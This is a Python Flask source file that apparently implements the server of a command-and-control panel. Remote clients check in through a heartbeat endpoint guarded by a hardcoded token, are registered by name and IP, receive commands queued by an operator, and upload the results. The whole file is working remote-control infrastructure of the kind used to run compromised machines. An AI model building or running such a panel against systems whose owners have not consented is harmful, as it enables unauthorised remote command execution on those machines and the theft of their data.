#!/usr/bin/python
# coding=utf-8
'''
Author: Recar
Date: 2022-10-03 08:16:00
LastEditors: Recar
LastEditTime: 2022-10-03 11:16:44
'''

import datetime
from . import app, db
from flask import render_template, request, jsonify
from app.models import Clients, EchoResult


@app.route("/")
def index():
    client_list = Clients.query.order_by(Clients.update_time).all()
    return render_template(
        "index.html", clients = client_list)

@app.route("/heartbeat/", methods=["POST"])
def heartbeat():
    data = request.get_json()
    print(data)
    token = data.get("token")
    if token !="bkq98":
        return jsonify({})
    # 先判断是否需要注册client
    name = data.get("name")
    ip = request.remote_addr
    client_result = data.get("result")
    client_cmd_id = data.get("cmd_id")
    db_client = Clients.query.filter(Clients.name==name, Clients.ip==ip).first()
    if db_client:
        db_client.update_time = datetime.datetime.now()
        db.session.commit()
    else:
        client = Clients()
        client.name = name
        client.ip = ip
        try:
            db.session.add(client)
            db.session.commit()
        except Exception as e:
            print(e)
    if client_result:
        # 上次结果
        print("[+] client: "+name+" ip: "+ip+" upload result: "+ client_result)
        db_echo_result = EchoResult.query.filter(EchoResult.id==client_cmd_id).first()
        db_echo_result.result = client_result
        db.session.commit()
    # 获取是否有需要执行的命令
    db_echo_result = EchoResult.query.filter(EchoResult.client_name==name,EchoResult.ip==ip,EchoResult.result==None).first()
    if db_echo_result:
        cmd_id = db_echo_result.id
        cmd = db_echo_result.cmd
        print("[+] server issued cmd:"+cmd+" name: " +name+" ip: "+ip)
        return jsonify({"cmd_id":cmd_id, "cmd":cmd})
    return jsonify({})

@app.route("/cmd/<name>/<ip>/", methods=["GET"])
def cmd_html(name, ip):
    return render_template(
            "cmd.html", name=name, ip = ip)

@app.route("/cmd/<name>/<ip>/", methods=["POST"])
def cmd(name, ip):
    data = request.get_json()
    cmd = data.get("cmd")
    er = EchoResult()
    er.client_name = name
    er.ip = ip
    er.cmd = cmd
    db.session.add(er)
    db.session.commit()
    return jsonify({"cmd_id":er.id})

@app.route("/result/<cmd_id>")
def get_result(cmd_id):
    db_echo_result = EchoResult.query.filter(EchoResult.id==cmd_id).first()
    if db_echo_result:
        return jsonify({"result":db_echo_result.result})
    else:
        return jsonify({"result":""})